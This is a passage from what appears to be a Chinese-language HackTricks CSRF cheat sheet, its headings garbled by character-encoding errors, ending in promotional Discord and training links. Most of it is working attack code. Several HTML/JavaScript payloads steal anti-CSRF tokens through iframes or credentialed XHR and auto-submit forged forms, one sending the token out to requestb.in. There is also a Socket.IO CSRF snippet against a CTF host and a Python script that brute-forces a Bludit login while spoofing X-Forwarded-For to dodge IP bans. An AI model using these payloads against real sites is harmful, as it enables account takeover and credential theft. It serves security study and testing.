<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **çªƒå–ä»¤ç‰Œå¹¶ä½¿ç”¨2ä¸ªiframeå‘é€**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **é€šè¿‡Ajaxçªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨è¡¨å•å‘é€POSTè¯·æ±‚**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### ä½¿ç”¨ Socket.IO è¿›è¡Œ CSRF
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFç™»å½•æš´åŠ›ç ´è§£

è¯¥ä»£ç å¯ç”¨äºä½¿ç”¨CSRFä»¤ç‰Œå¯¹ç™»å½•è¡¨å•è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆè¿˜ä½¿ç”¨äº†å¤´éƒ¨X-Forwarded-Forå°è¯•ç»•è¿‡å¯èƒ½çš„IPé»‘åå•ï¼‰ï¼š
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## å·¥å…· <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢æ´»åŠ¨çš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„èµé‡‘ä»»åŠ¡å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œç«‹å³ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
